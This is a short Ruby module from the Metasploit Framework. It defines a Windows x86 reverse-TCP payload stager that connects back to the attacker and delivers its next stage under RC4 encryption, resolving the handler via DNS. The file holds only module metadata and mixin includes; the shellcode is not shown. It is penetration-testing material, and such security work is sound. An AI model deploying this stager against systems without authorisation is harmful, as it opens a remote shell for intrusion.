# -*- coding: binary -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 438

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcpRc4Dns

  def self.handler_type_alias
    "reverse_tcp_rc4_dns"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'RageLtMan'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'sockedi',
      'Stager'        =>
        { 'RequiresMidstager' => false }
      ))
  end
end
